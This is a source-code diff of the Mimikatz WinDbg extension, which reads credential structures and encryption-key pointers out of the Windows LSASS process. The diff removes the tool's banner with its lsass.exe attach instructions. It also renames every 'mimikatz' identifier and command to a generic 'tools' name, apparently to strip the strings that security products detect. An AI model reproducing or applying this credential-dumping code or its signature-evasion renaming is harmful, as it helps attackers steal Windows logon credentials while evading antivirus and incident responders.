@@ -25,27 +25,27 @@ VOID WDBGAPI kdbg_WinDbgExtensionDllInit(PWINDBG_EXTENSION_APIS lpExtensionApis,
 	ExtensionApis = *lpExtensionApis;
 	NtBuildNumber = usMinorVersion;
 	
-	dprintf("\n"
-		"  .#####.   " MIMIKATZ_FULL_A "\n"
-		" .## ^ ##.  " MIMIKATZ_SECOND_A " - Windows build %hu\n"
-		" ## / \\ ##  /* * *\n"
-		" ## \\ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n"
-		" '## v ##'   https://blog.gentilkiwi.com/mimikatz             (oe.eo)\n"
-		"  '#####'                                  WinDBG extension ! * * */\n\n"
-		"===================================\n"
-		"#         * Kernel mode *         #\n"
-		"===================================\n"
-		"# Search for LSASS process\n"
-		"0: kd> !process 0 0 lsass.exe\n"
-		"# Then switch to its context\n"
-		"0: kd> .process /r /p <EPROCESS address>\n"
-		"# And finally :\n"
-		"0: kd> !mimikatz\n"
-		"===================================\n"
-		"#          * User mode *          #\n"
-		"===================================\n"
-		"0:000> !mimikatz\n"
-		"===================================\n\n" , NtBuildNumber);
+	// dprintf("\n"
+	// 	"  .#####.   " TOOLS_FULL_A "\n"
+	// 	" .## ^ ##.  " TOOLS_SECOND_A " - Windows build %hu\n"
+	// 	" ## / \\ ##  /* * *\n"
+	// 	" ## \\ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n"
+	// 	" '## v ##'   https://blog.gentilkiwi.com/tools             (oe.eo)\n"
+	// 	"  '#####'                                  WinDBG extension ! * * */\n\n"
+	// 	"===================================\n"
+	// 	"#         * Kernel mode *         #\n"
+	// 	"===================================\n"
+	// 	"# Search for LSASS process\n"
+	// 	"0: kd> !process 0 0 lsass.exe\n"
+	// 	"# Then switch to its context\n"
+	// 	"0: kd> .process /r /p <EPROCESS address>\n"
+	// 	"# And finally :\n"
+	// 	"0: kd> !tools\n"
+	// 	"===================================\n"
+	// 	"#          * User mode *          #\n"
+	// 	"===================================\n"
+	// 	"0:000> !tools\n"
+	// 	"===================================\n\n" , NtBuildNumber);
 }
 
 const char * KUHL_M_SEKURLSA_LOGON_TYPE[] = {
@@ -70,7 +70,7 @@ KUHL_M_SEKURLSA_PACKAGE packages[] = {
 const KUHL_M_SEKURLSA_ENUM_HELPER lsassEnumHelpers[] = {
 	{sizeof(KIWI_MSV1_0_LIST_60), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_60, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, CredentialManager), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, LogonTime), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, LogonServer)},
 	{sizeof(KIWI_MSV1_0_LIST_61), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_61, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, CredentialManager), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, LogonTime), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, LogonServer)},
-	{sizeof(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, CredentialManager), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, LogonTime), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, LogonServer)},
+	{sizeof(KIWI_MSV1_0_LIST_61_ANTI_TOOLS), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_TOOLS, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_TOOLS, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_TOOLS, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_TOOLS, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_TOOLS, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_TOOLS, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_TOOLS, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_TOOLS, CredentialManager), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_TOOLS, LogonTime), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_TOOLS, LogonServer)},
 	{sizeof(KIWI_MSV1_0_LIST_62), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_62, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, CredentialManager), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, LogonTime), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, LogonServer)},
 	{sizeof(KIWI_MSV1_0_LIST_63), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_63, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, CredentialManager), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, LogonTime), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, LogonServer)},
 };
@@ -80,7 +80,7 @@ DECLARE_API(kdbg_coffee)
 	dprintf("\n    ( (\n     ) )\n  .______.\n  |      |]\n  \\      /\n   `----'\n");
 }
 
-DECLARE_API(kdbg_mimikatz)
+DECLARE_API(kdbg_tools)
 {
 	ULONG_PTR pInitializationVector = 0, phAesKey = 0, ph3DesKey = 0, pLogonSessionList = 0, pLogonSessionListCount = 0, pSecData = 0, pDomainList = 0;
 	PLIST_ENTRY LogonSessionList;
